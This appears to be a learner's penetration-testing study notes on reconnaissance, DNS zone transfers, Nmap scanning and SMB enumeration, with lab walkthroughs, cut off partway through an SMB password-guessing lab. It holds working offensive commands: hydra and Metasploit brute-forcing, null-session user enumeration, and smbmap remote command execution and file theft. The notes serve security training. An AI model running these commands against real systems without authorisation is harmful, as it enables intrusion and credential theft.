# Table of Contents
- [Information Gathering](#1)
  - [Small list of information we may look for](#1.1)
    - [In a passive scan](#1.1.1)
    - [In an active scan](#1.1.2)
- [Website Reconnaissance](#2)
  - [Whois Enumeration](#2.1)
  - [Website footprinting with Netcraft](#2.2)
  - [DNS Reconnaissance](#2.3)
    - [dnsrecon](#2.3.1)
    - [dnsrecon](#2.3.2)
  - [WAF detection](#2.4)
  - [Subdomain enumeration with Sublist3r](#2.5)
  - [Google Hacking/Dorking](#2.6)
    - [Found something.](#2.6.1)
  - [Email gathering with theHarvester](#2.7)
  - [Leaked credentials](#2.8)
- [Active information gathering.](#3)
  - [DNS zone transfers](#3.1)
    - [What is a DNS?](#3.1.1)
    - [Types of DNS records](#3.1.2)
    - [DNS interrogation](#3.1.3)
    - [DNS zone transfers](#3.1.4)
    - [More "in-depth" view on how to do DNS transfers](#3.1.5)
  - [Host discovery with Nmap](#3.2)
    - [Port Scanning with Nmap](#3.2.1)
    - [It's lab time.](#3.2.2)
- [Recon: footprinting and scanning](#4)
  - [Mapping a network](#4.1)
  - [Tools](#4.2)
    - [Wireshark](#4.2.1)
    - [Ping/Fping/ARP](#4.2.2)
    - [Zenmap](4.2.3)
  - [Port scanning](#4.3)
    - [Moar labs!!!](#4.3.1)
    - [Task: Scan the server 1](#4.3.2)
    - [Task: Scan the server (non-standard port locations)](#4.3.3)
    - [Task: Scan the server 3 (FUCKEN UDP SCAN)](#4.3.4)
- [Recon: Host Enumeration](#5)
  - [Servers and services](#5.1)
  - [SMB Discovery and Mounting](#5.2)
  - [SMB NSE scripts](#5.3)
    - [Windows Recon: SMB scripts lab](#5.3.1)
  - [SMB: SMBmap](#5.4)
    - [Windows Recon: SMBmap lab](#5.4.1)
  - [SMB: Samba 1](#5.5)
    - [SMB: Samba 1 Lab](#5.5.1)
  - [SMB: Samba 2](#5.6)
    - [SMB: Samba 2 Lab](#5.6.1)
  - [SMB: Samba 3](#5.7)
    - [SMB: Samba 3 Lab](#5.7.1)
  - [SMB Dictionary Attack](#5.8)
    - [SMB Dictionary Attack Lab](#5.8.1)
  - [FTP service enumeration.](#5.9)
    - [ProFTP Recon: Basics lab](#5.9.1)
  - [VSFTPD Recon: Basics](#5.10)
    - [VSFTPD Recon: Basics lab](#5.10.1)
  - [SSH Recon: Basics](#5.11)
  - [SSH Dictionary Attacks](#5.12)
    - [SSH Dictionary Attacks: Lab](#5.12.1)
  - [HTTP Recon](#5.13)
  - [HTTP IIS: Nmap scripts](#5.14)
  - [HTTP Apache](#5.15)
    - [Apache HTTP Lab](#5.15.1)
  - [MySQL Recon](#5.16)
  - [MySQL Dictionary Attacks](#5.17)
  - [MSSQL Nmap Scripts](#5.18)
  - [MSSQL Metasploit](#5.19)
- [Recon: Vulnerability Assessment](#6)
  - [Vulnerabilities](#6.1)
    - [Understanding vulnerability detail pages.](#6.1.1)
  - [0days](#6.2)
    - [The human side of vulnerabilities.](#6.2.1)
  - [Case studies](#6.3)
    - [Heartbleed](#6.3.1)
    - [EternalBlue](#6.3.2)
    - [Log4Shell](#6.3.3)
  - [Nessus](#6.4)
  - [Vulnerability Assessment](#6.5)
    - [Windows: Easy File Sharing Server Lab](#6.5.1)


<a id="1"></a>
# Information gathering

Information gathering or reconnaissance is the first stage of any penetration test and it involves gathering
or collecting information about a company or an individual. It's separated into two stages: passive and active 
information gathering. The passive stage strives to recollect information about the target from external sources,
thus not directly interacting with the objective. On the other hand, active information gathering actually
interacts with the systems, be it through banner grabbing, port scans, interacting with users, etc.

<a id="1.1"></a>
## Small list of information we may look for

<a id="1.1.1"></a>
### In a passive scan
- Identifying IP addresses and DNS information.
- Domain names and public domain ownership information.
- Email addresses, social media profiles and phone numbers.
- The web technologies used by the target.
- Leaked credentials.
- Subdomains and hidden subdirectories.

<a id="1.1.2"></a>
### In an active scan: 
- Open ports on the target systems.
- The internal infrastructure of the target organization.
- Enumerating information from the target systems.

<a id="2"></a>
# Website reconnaissance and footprinting

Target is hackersploit.org

```bash
$ host hackersploit.org
hackersploit.org has address 104.21.44.180
hackersploit.org has address 172.67.202.99
hackersploit.org has IPv6 address 2606:4700:3031::6815:2cb4
hackersploit.org has IPv6 address 2606:4700:3036::ac43:ca63
hackersploit.org mail is handled by 0 _dc-mx.2c2a3526b376.hackersploit.org.
```

Robots:

```
User-agent: *
Disallow: /wp-content/uploads/wpo-plugins-tables-list.json

# START YOAST BLOCK
# ---------------------------
User-agent: *
Disallow:

Sitemap: https://hackersploit.org/sitemap_index.xml
# ---------------------------
# END YOAST BLOCK
```

Sitemap_index:

https://hackersploit.org/sitemap_index.xml

Useful Firefox plugins for web recon:
- Wappalyzer
- BuiltWith
In the terminal we can also use whatweb:

```bash
$ whatweb hackersploit.org
http://hackersploit.org [301 Moved Permanently] Country[UNITED STATES][US], HTTPServer[cloudflare], IP[104.21.44.180], RedirectLocation[https://hackersploit.org/], UncommonHeaders[report-to,nel,cf-ray]
https://hackersploit.org/ [403 Forbidden] Country[UNITED STATES][US], HTML5, HTTPServer[cloudflare], IP[104.21.44.180], Title[403 Forbidden][Title element contains newline(s)!], UncommonHeaders[referrer-policy,x-turbo-charged-by,cf-cache-status,report-to,nel,cf-ray,alt-svc]
```

Useful tool to have in mind during web reconnaissance:
- httrack

<a id="2.1"></a>
## Whois enumeration

```bash 
$ whois hackersploit.org
Domain Name: hackersploit.org
Registry Domain ID: 77f8fe62a425487cbefef4bf7e27d2ec-LROR
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: http://www.namecheap.company
[\/ SNIP \/]
```

<a id="2.2"></a>
## Website footprinting with Netcraft

Access [Netcraft](https://sitereport.netcraft.com/). Then, we can pick a webpage to check
what it's running. It automates the process from the previous manual reconnaissance
techniques we've used before. 

<a id="2.3"></a>
## DNS reconnaissance

<a id="2.3.1"></a>
### dnsrecon

```bash
$ dnsrecon -d hackersploit.org
[*] std: Performing General Enumeration against: hackersploit.org...
[*] DNSSEC is configured for hackersploit.org
[*] DNSKEYs:
[\/ SNIP \/]
```

<a id="2.3.2"></a>
### dnsdumpster

[dnsdumpster](https://dnsdumpster.com/) is another tool used in DNS recon. Using this tool
we can discover a subdomain called forum.hackersploit.org. 

<a id="2.4"></a>
## WAF detection

```bash
$ wafw00f https://hackersploit.org 

                ______
               /      \
              (  W00f! )
               \  ____/
               ,,    __            404 Hack Not Found
           |`-.__   / /                      __     __
           /"  _/  /_/                       \ \   / /
          *===*    /                          \ \_/ /  405 Not Allowed
         /     )__//                           \   /
    /|  /     /---`                        403 Forbidden
    \\/`   \ |                                 / _ \
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error
      `_____``-`                             /_/   \_\

                        ~ WAFW00F : v2.2.0 ~
        The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking https://hackersploit.org
[+] The site https://hackersploit.org is behind Cloudflare (Cloudflare Inc.) WAF.
[~] Number of requests: 2
```

<a id="2.5"></a>
## Subdomain enumeration with Sublist3r

```bash
$ sublist3r -d hackersploit.org 

                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \___ \| | | | '_ \| | / __| __| |_ \| '__|
                 ___) | |_| | |_) | | \__ \ |_ ___) | |
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la
    
[-] Enumerating subdomains now for hackersploit.org
[-] Searching now in Google..
[-] Searching now in Yahoo..
[\/ SNIP \/]
```

<a id="2.6"></a>
## Google Dorking/Hacking

Megabase: https://www.exploit-db.com/google-hacking-database

```
Operators:
site:{site}   // Displays only pages within that domain plus subdomains.
inurl:{text}    // Searches for specific words in URLs.
intitle:{text}  // Searches for specific words in the title of a webpage.
filetype:{text} // Searches for a specific filetype.
(dork) {kword}  // Add a keyword after a dork.
cache:{site}    // Check and older (cached) version of a webpage.
```

<a id="2.6.1"></a>
### Found something.

This is not related to the course, although it kinda is. I found a vulnerability and reported it.
It was a directory listing vulnerability. I sent the sysadmin an email with mitigations, how I found 
it and my contact. I hope they fix it. 

<a id="2.7"></a>
## Email harvesting with theHarvester

```bash
$ theharvester -d hackersploit.org -b crtsh,dnsdumpster,duckduckgo,yahoo,bing
*******************************************************************
*  _   _                                            _             *
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
*                                                                 *
* theHarvester 4.4.0                                              *
* Coded by Christian Martorella                                   *
* Edge-Security Research                                          *
* cmartorella@edge-security.com                                   *
*                                                                 *
*******************************************************************

[*] Target: zonetransfer.me 
[\/ SNIP \/]
```

<a id="2.8"></a>
## Leaked credentials

Check [Have I Been Pwned?](https://haveibeenpwned.com/) with the emails taken from *the harvesting...*

<a id="3"></a>
# Active information gathering

<a id="3.1"></a>
## DNS zone transfers.

<a id="3.1.1"></a>
### What is a DNS?

DNS is a protocol used to resolve domain names to IP addresses. During the 
early days of the internet, users had to remember the IP addresses for any service
they wanted to visit or interact with. DNS solves this issue. 

A DNS is like a phone directory that contains all the domain names with their respective
IP addresses. Popular ones are 1.1.1.1 (Cloudflare), 8.8.8.8 (Google), 8.8.4.4 (Google)

<a id="3.1.2"></a>
### Type of DNS records

| Record         | What it means              |
|--------------- | -------------------------- |
| A              | IPv4 Address               |
| AAAA           | IPv6 Address               |
| NS             | Reference to DNS           |
| MX             | Resolves to mail server    |
| CNAME          | Domain aliases             |
| TXT            | TXT record                 |
| HINFO          | Host information           |
| SOA            | Domain authority           |
| SRV            | Service records            |
| PTR            | Resolves an IP to hostname |

<a id="3.1.3"></a>
### DNS interrogation

DNS interrogation is the process of enumerating DNS records for a specific domain.
The objective of a DNS interrogation is to probe a DNS server to provide us with 
DNS records for a specific domain. This process ca provide with important information
like the IP address of the domain, subdomains, mail servers, etc.

<a id="3.1.4"></a>
### DNS Zone Transfer 

In certain cases, admins may want to copy DNS records from one server to another.
This is the zone transfer process.

If misconfigured and/or left unsecured, this functionality can be abused by attackers
to copy the zone file from the primary DNS server to another DNS server.

A DNS zone transfer can provide pentesters with a holistic view of an organization's layout.
Furthermore, in some cases internal network addresses may be found on an organization's DNS
servers.

```bash
$ dnsrecon -d zonetransfer.me 
[*] std: Performing General Enumeration against: zonetransfer.me...
[-] DNSSEC is not configured for zonetransfer.me
[*] 	 SOA nsztm1.digi.ninja 81.4.108.41
[\/ SNIP \/]
# SOA is nsztm1.digi.ninja. so we will transfer from there.
# dnsenum will do an automatic DNS transfer.
$ dnsenum zonetransfer.me
[\/ SNIP \/]
Trying Zone Transfer for zonetransfer.me on nsztm2.digi.ninja ... 
zonetransfer.me.                         7200     IN    SOA               (
zonetransfer.me.                         300      IN    HINFO        "Casio"
[\/ SNIP \/]
# Manual zone transfer
$ dig axfr @nsztm1.digi.ninja zonetransfer.me

; <<>> DiG 9.18.16 <<>> axfr @nsztm1.digi.ninja zonetransfer.me
; (1 server found)
;; global options: +cmd
zonetransfer.me.	7200	IN	SOA	nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
[\/ SNIP \/]
# Fierce is a tool locating non-contiguous IP spaces
$ fierce --domain zonetransfer.me
NS: nsztm1.digi.ninja. nsztm2.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
[\/ SNIP \/]
```

<a id="3.1.5"></a>
### More "in-depth" view on how to do DNS transfers

Let's use zonetransfer.me as our target. First we need to get the SOA, or the 
DNS authority (actually named Start of Authority). For that, we can run the 
following command:

```bash
$ dig zonetransfer.me SOA
[\/ SNIP \/]
;; ANSWER SECTION:
zonetransfer.me.	6923	IN	SOA	nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
[\/ SNIP \/]
```

In this case we easily find the SOA. But it won't always be the case. Sometimes it might be trickier to find 
the SOA; nevertheless, lets continue.

Now that we have the SOA, we can try to do the zone transfer. For that, we'll run the following command:

```bash
$ dig axfr @nsztm1.digi.ninja. zonetransfer.me 
; <<>> DiG 9.18.16 <<>> axfr @nsztm1.digi.ninja zonetransfer.me
; (1 server found)
;; global options: +cmd
zonetransfer.me.	7200	IN	SOA	nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
zonetransfer.me.	300	IN	HINFO	"Casio fx-700G" "Windows XP"
zonetransfer.me.	301	IN	TXT	"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
[\/ SNIP \/]
```

Nice! We did the zone transfer. But wait. If we remember, when we used DNSdumpster on the webpage,
we got 2 DNS servers. The second one was nsztm2.digi.ninja. We could try to run an AXFR on that server.

```bash
$ dig axfr @nsztm2.digi.ninja. zonetransfer.me 
; <<>> DiG 9.18.16 <<>> axfr @nsztm2.digi.ninja. zonetransfer.me
; (1 server found)
;; global options: +cmd
zonetransfer.me.	7200	IN	SOA	nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
zonetransfer.me.	300	IN	HINFO	"Casio fx-700G" "Windows XP"
zonetransfer.me.	301	IN	TXT	"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
[\/ SNIP \/]
```

Nice, although they appear to be the same. Maybe this could be useful in the future, maybe not. Who knows!

<a id="3.2"></a>
## Host Discovery with Nmap

```bash
$ sudo nmap -sn 192.168.1.0/24 # Ping probes
[\/ SNIP \/]
$ sudo netdiscover -i enp0s3 -r 192.168.1.0/24 # ARP probing
```

<a id="3.2.1"></a>
### Port Scanning with Nmap

```bash
# Don't send ping probes, just SYN!
$ nmap -Pn 10.4.19.210
# Don't send ping probes and scan every port!
$ nmap -Pn -p- 10.4.19.210
# Don't send ping probes and scan only the given ports!
$ nmap -Pn -p 53,80,443 1-1000 10.4.19.210
# Fast scan go brr!!
$ nmap -Pn -F 10.4.19.210
# UDP port scan
$ nmap -Pn -sU 10.4.19.210
# Detect service versions!
$ nmap -Pn -sV 10.4.19.210
# Detect operating systems if possible
$ nmap -Pn -O 10.4.19.210
# Run default scripts on open ports
$ nmap -Pn -sC 10.4.19.210
# Make your scans slower or faster.
# Smaller numbers are slower scans.
# From T0 to T5.
$ nmap -Pn -T1 -10.4.19.210
# Output scan to file.
$ nmap -Pn -oN scan.txt 10.4.19.210
# Output scan to XML.
$ nmap -Pn -oX scan.xml 10.4.19.210 
```

<a id="3.2.2"></a>
### It's lab time.

Overview:
*A Kali GUI machine and a target machine are provided to you. The target machine is running a Windows Firewall. Your task is to discover available live hosts and their open ports using Nmap and identify the running services and applications.*

```bash
# Scan results of "nmap -Pn -sV -O -Pn $TARGET"
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012
OS details: Microsoft Windows Server 2012
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

<a id="4"></a>
# Recon: footprinting and scanning.

<a id="4.1"></a>
## Mapping a network.

The purpose of mapping a network is to create a scope and give all the possible value the
pentester can give. 

Processes:

- Physical access
  - Physical security 
  - OSINT 
  - Social Engineering
- Sniffing 
  - Passive reconnaissance
  - Watch network traffic
- ARP
  - Address resolution protocol
    - Resolves IP to MAC addresses.
    - "Who has {ip}? Tell {attacker}"
    - "{ip} is at {mac}"
    - ARP scanning.
- ICMP
  - RFC 792 
  - Traceroute
  - Ping 
    - Sends type 8 packets: echo requests.
- Tools
  - Wireshark
  - ARP-SCAN
  - Ping
  - Fping 
  - Nmap 
  - Zenmap

<a id="4.2"></a>
## Tools

<a id="4.2.1"></a>
### Wireshark

To get a list of active hosts, we can go to Statistics -> Endpoints.

<a id="4.2.2"></a>
### Ping/Fping/ARP

```bash
# Boring Ping. Does nothing but ping.
$ ping google.com 
# Ping's cooler little brother, Fping.
$ fping -I enp0s3 -g 192.168.0.0/24 -a 2>/dev/null 
# ARP-SCAN
$ arp-scan -I enp0s3 -g 192.168.0.0/24 
```

<a id="4.2.3"></a>
### Zenmap

Nmap but with GUI and topology tool. Pretty cool.

<a id="4.3"></a>
## Port scanning

When doing port scans, I like to use the `--packet-trace` flag and redirect the output to a file 
or maybe do an -oN. 

My scanning process goes like this:

```bash
$ fping -I enp0s3 -g 192.168.0.0/24 > alive 2>/dev/null 
$ sudo arp-scan -I enp0s3 -g 192.168.0.0/24 --resolve --plain --format="${IP}\t--MAC: ${MAC}\t--Hostname: ${Name}"
$ sed '/unreachable/d' alive
$ cat alive | awk ' { print $1} ' | tee actually_alive
$ rm alive
$ nmap -iL actually_alive -sV --top-ports=100 # -Pn is unnecesary given we got our targets from fping
```

<a id="4.3.1"></a>
### Moar labs!!!

Windows Recon with Zenmap!!!!

Your task is to discover the live host machines using the provided Zenmap tool. 
The subnet mask you need to focus on is "255.255.240.0" and CIDR 20. 

Here we can simply run a Ping scan on the our entire network to get all our friend
PCs.

<a id="4.3.2"></a>
### Task: Scan the server 1 

Target interface is eth1.

We're presented with two different networks: 10.0.0.0/16 and 192.150.25.0/24. We know from the
explanatory lab video that we have to check the 192.yadda yadda network. We'll first run ARP-scan and
fping.

```bash
$ fping -I eth1 -g 192.150.25.0/24 > alive 2>/dev/null
$ sed '/unreachable/d' alive
$ cat alive | awk ' { print $1} ' | tee actually_alive
$ arp-scan -I eth1 -g 192.150.25.0/24 
$ nmap -sV -A -O -p- -iL actually_alive
```

<a id="4.3.3"></a>
### Task: Scan the server 2 (non-standard port locations)

Target interface is eth1.

Find the SMTP, FTP and DNS services. They're on non-standard ports.

```bash
$ fping -I eth1 -g 192.99.77.0/24
$ nmap -sV -O 192.99.77.3 
# Nothing was found.
$ nmap -sV -O -p- 192.99.77.3 
PORT    STATE SERVICE VERSION
177/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
# Only the DNS has been found. Let's run a ranged UDP scan, otherwise it'd take 1000 years.
$ nmap -sU -p1-250 192.99.77.3
PORT    STATE         SERVICE
134/udp open|filtered ingres-net
177/udp open|filtered xdmcp
234/udp open|filtered unknown
# Let's run a service scan.
$ nmap -sU -p134,177,234 -sV 192.99.77.3 
134/udp open|filtered ingres-net
177/udp open          domain     ISC BIND 9.10.3-P4 (Ubuntu Linux)
234/udp open          snmp       SNMPv1 server; net-snmp SNMPv3 server (public)
$ tftp 192.99.77.3 134 
# Establishes a connection.
```

<a id="4.3.4"></a>
### Task: Scan the server 3 (FUCKEN UDP SCAN)

```
$ nmap -sU -p- -T4 192.168.230.3
# YEEEEEARS. Port 161. No accurate server is given,
$ nmap -sUV -A -T4 -p 161 192.168.230.3 
```

<a id="5"></a>
# Recon: Host Enumeration.

<a id="5.1"></a>
## Servers and services

A server is that, a server. It's a computer that servers something up 
for users or other devices. This services are open to windows, that is, 
network ports. Certain services use certain ports, -- which in some cases may
be modified -- and we have to access those ports to access the services served 
by the server.

<a id="5.2"></a>
## SMB discovery and mounting

```powershell
> net use [LETTER]: \\[DOMAIN]\[VOLUME/FOLDER]$ {PASSWORD} {/user:[USER]}
> net use [LETTER/*] /delete
```

<a id="5.3"></a>
## SMB NSE scripts

Some of the scripts are:

| Script            | Function                                                                           |
|------------------ | ---------------------------------------------------------------------------------- |
| smb-protocols     | Enumerates protocols and dialects that the SMB is currently using.                 |
| smb-security-mode | Dumps the security mode of the SMB share.                                          |
| smb-enum-sessions | Used to enumerate the current sessions of the SMB share. (Users logged in)         |
| smb-enum-shares   | Enumerates the existing shares in the SMB server.                                  |
| smb-enum-users    | Attempts to enumerate all existing users within the SMB share.                     |
| smb-server-stats  | Dumps the server statistics.                                                       |
| smb-enum-domains  | Enumerates the existing domains.                                                   |
| smb-enum-groups   | Enumerates the groups inside the share.                                            |
| smb-enum-services | Enumerates the existing services.                                                  |
| smb-ls            | List something within a share. Useful to combine with smb-enum-shares.             |
| smb-enum-domains  | Enumerates the existing domains.                                                   |

Usage:

```bash
$ nmap --script smb-protocols [TARGET] -p445
$ nmap --script smb-security-mode [TARGET] -p445
$ nmap --script smb-enum-sessions [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-shares [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-users [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-server-stats [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-domains [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-groups [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-services [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-ls [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-enum-shares,smb-ls [TARGET] -p445 --script-args {smbusername=username,smbpassword=password}
$ nmap --script smb-os-discovery [TARGET] -p445 
```

Notes: if an IPC share is found, it could serve as a NULL session, or an anonymous user. The print share is used
to do exactly that, print stuff.

<a id="5.3.1"></a>
### Windows Recon: SMB scripts lab.

Objectives: 
1. Enumerate SMB protocols and dialects.
2. Dump SMB security information.
3. Enumerate active sessions, users, domains, services, etc.

Target is: 10.4.20.49

```bash
$ target=10.4.20.49
$ nmap -p445 $target --script smb-protocols,smb-security-mode
Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
$ nmap -p445 $target --script smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-enum-services --script-args smbusername=administrator,smbpassword=password
# It's also possible to do the following:
$ nmap -p445 $target --script smb-enum-* --script-args smbusername=administrator,smbpassword=password
# The * selects all scripts under smb-enum-.
# I will omit the output, as it is TOO LONG! So use -oN when doing this.
[\/ SNIP \/]
```

<a id="5.4"></a>
## SMB: SMBmap

```bash
# For shares with SMBv1 or IPC enabled.
$ smbmap -u guest -p "" -d . -H {target}
# For shares we have admin access (or user access) to.
$ smbmap -u {user} -p {password} -d . -H {target} -x {command to execute}
# List shares.
$ smbmap -u {user} -p {password} -d . -H {target} -L 
# Read files from a share.
$ smbmap -u {user} -p {password} -d . -H {target} -r "{share}$"
# Upload a file.
$ smbmap -u {user} -p {password} -d . -H {target} --upload '/path/to/file' '{share}$\path\to\upload'
# Download a file
$ smbmap -u {user} -p {password} -d . -H {target} --download '{share}$\megacorp_passwords.txt'
# Delete a file
$ smbmap -u {user} -p {password} -d . -H {target} --delete '{share}$\ultra_hidden_backdoor.exe'
```

<a id="5.4.1"></a>
### Windows Recon: smbmap

Objective: enumerate the shares and GET THE FLAG!

```bash
$ smbmap -u administrator -p password -d . -H $target -r
[\/ SNIP \/]
.\C\*
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
[\/ SNIP \/]
$ smbmap -u administrator -p password -d . -H $target --download 'C$\flag.txt'
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.4.26.56-C_flag.txt
```

Note to myself: when referring to a share, don't put colons after the share. Just use the dollar sign and backslash.

<a id="5.5"></a>
## SMB: Samba 1

In this section we're looking at a Linux SMB server. Nmap gets kinda confused, so we have to do some
things manually.

```bash
$ nmap -sV -O -A [TARGET] 
$ nmap -p445 [TARGET] --script smb-os-discovery
$ msfconsole
msf5 > use auxiliary/scanner/smb/smb-version
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > run
$ nmblookup -A [TARGET]
$ smbclient -L [TARGET] -N
$ rpcclient -U "" -N [TARGEt]
```

<a id="5.5.1"></a>
### SMB: Samba 1 Lab

Objective: Find the Netbios-ssn workgroup of the server.

```bash
$ nmap -sV -A -T4 $target
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
```

<a id="5.6"></a>
## SMB: Samba 2 

```bash
# Start a null session.
$ rcpclient -U "" -N [TARGET]
# Get server info from share.
> srvinfo
# For OS enumeration
$ enum4linux -o [TARGET]
msf5 > use auxiliary/scanner/smb/smb2 
msf5 auxiliary > set RHOSTS [TARGET]
$ enum4linux -U [TARGET]
$ rpcclient -U "" -N [target]
rpcclient > enumdomusers 
rpcclient > lookupnames [USER]
```

<a id="5.6.1"></a>
### SMB: Samba 2 Lab

Objective: find the admin SID.

```bash
$ nmap -sV -A -T4 --script smb-enum-users,smb-enum-shares $target 
[\/ SNIP \/]
| smb-enum-shares: 
|   account_used: guest
|   \\192.106.16.3\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
[\/ SNIP \/]
| smb-enum-users: 
|   SAMBA-RECON\admin (RID: 1005)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
[\/ SNIP \/]
# Given this information, we can use rpcclient with a null session to look up names.
$ rpcclient -U "" -N $target
rpcclient > lookupnames admin
admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
```

<a id="5.7"></a>
## SMB: Samba 3

```bash
msf5 > use auxiliary/scanner/smb/smb-enumshares
msf5 auxiliary > set RHOSTS [TARGEt]
$ enum4linux -S [TARGET]
$ enum4linux -G [TARGET]
$ enum4linux -i [TARGET]
$ rpcclient -U "" -N [TARGEt]
rpcclient $> enumdomgroups
```

<a id="5.7.1"></a>
### SMB: Samba 3 Lab

Objective: get teh flag!11!

```bash
$ nmap -sV -A -T4 $target
# We find 445 and 139 open, as it's the SMB target.
$ nmap -sV -A -T4 $target --script smb-enum-shares
[\/ SNIP \/]
| smb-enum-shares: 
|   account_used: guest
|   \\192.252.68.3\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
[\/ SNIP \/]
# If the info is correct, a NULL session might be possible to use.
$ rpcclient -U "" -N $target
rpcclient $> enumdomgroups
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]
rpcclient $> enumdomusers 
user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
# Nice, we have a NULL session. Let's connect to the share 
# via smbclient.
$ smbclient -L -N //$target/public
smb: \> dir 
  secret                              D        0  Tue Nov 27 13:36:13 2018
smb: \> cd secret
smb: \secret\> dir
  flag                                N       33  Tue Nov 27 13:36:13 2018
smb: \secret\> get flag
# This will download the flag. Outside smbclient, we can open it
# using the cat command.
```

<a id="5.8"></a>
## SMB Dictionary Attack

```bash
msf5 > use auxiliary/scanner/smb/smb-login
msf5 auxiliary > set RHOSTS [TARGET]
msf5 auxiliary > set pass_file /path/to/wordlists
msf5 auxiliary > set smbuser [USER]
$ gzip -d /usr/share/wordlists/rockyou.txt.gz # RockYou on Kali.
$ hydra -l [USER] -P /usr/share/wordlists/rockyou.txt [TARGET] [PROTOCOL] # In this case it'd be smb.
msf5 > use auxiliary/scanner/smb/pipe-auditor
msf5 auxiliary > set smbuser [USER]
msf5 auxiliary > set smbpass [PASSWORD]
msf5 auxiliary > set RHOSTS [TARGET]
$ enum4linux -r -U [USER] -p [PASSWORD] [TARGET]
```

<a id="5.8.1"></a>
### SMB Dictionary Attack Lab

Objective: get da root flag! Crack into Jane's and Admin's accounts, although no password
was provided...

```bash
$ msfconsole
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary > set smbuser Jane
msf5 auxiliary > set rhosts $target
msf5 auxiliary > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary > run
# We get a hit on .\jane:safepass. So we'll use that later.
$ gzip -d /usr/share/wordlists/rockyou.txt.gz
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt $target smb
[445][smb] host: 192.122.87.3   login: admin   password: p4ssw0rd
# Sweet, we got a hit! Let's try to enumerate shares with our new creds.
$ smbclient -L -U admin $target
        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
# The output is the same if we run it with the jane user,
# so let's try to connect into jane's share.
$ smbclient -U jane //$target/jane
smb: \> dir
  flag                                D        0  Tue Nov 27 19:25:12 2018
  admin                               D        0  Tue Nov 27 19:25:12 2018
# There's a flag directory, let's cd into it. There's also an admin folder...
# maybe it contains some serious corpo creds!
smb: \> cd flag
smb: \flag\> dir
  flag                                N       33  Tue Nov 27 19:25:12 2018
smb: \flag\> get flag
# Although this flag is useless to us, it's good to keep practicing with the smbclient.
# Now let's get da root flag!!!!
$ smbclient -U admin //$target/admin
smb: \> dir
  hidden                              D        0  Tue Nov 27 19:25:12 2018
smb: \> cd hidden
smb: \hidden\> dir
